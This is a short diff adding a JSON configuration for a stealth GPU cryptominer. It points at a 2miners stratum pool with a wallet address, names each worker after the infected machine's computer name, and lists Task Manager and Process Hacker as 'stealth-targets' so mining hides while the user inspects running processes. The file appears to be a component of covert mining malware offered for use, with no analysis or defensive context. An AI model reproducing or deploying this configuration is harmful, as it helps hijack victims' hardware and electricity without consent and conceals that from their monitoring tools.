@@ -1,0 +1,10 @@
+{
+    "url": "stratums://`NTnEYHt6AQS5gSmuQjsq6VU5FHyZCwriR4`.{COMPUTERNAME}@xna.2miners.com:16060",
+    "algo": "kawpow",
+    "max-gpu": 0,
+    "idle-wait": 5,
+    "idle-gpu": 0,
+    "stealth-targets": "Taskmgr.exe,ProcessHacker.exe",
+    "kill-targets": "",
+    "stealth-fullscreen": false
+}
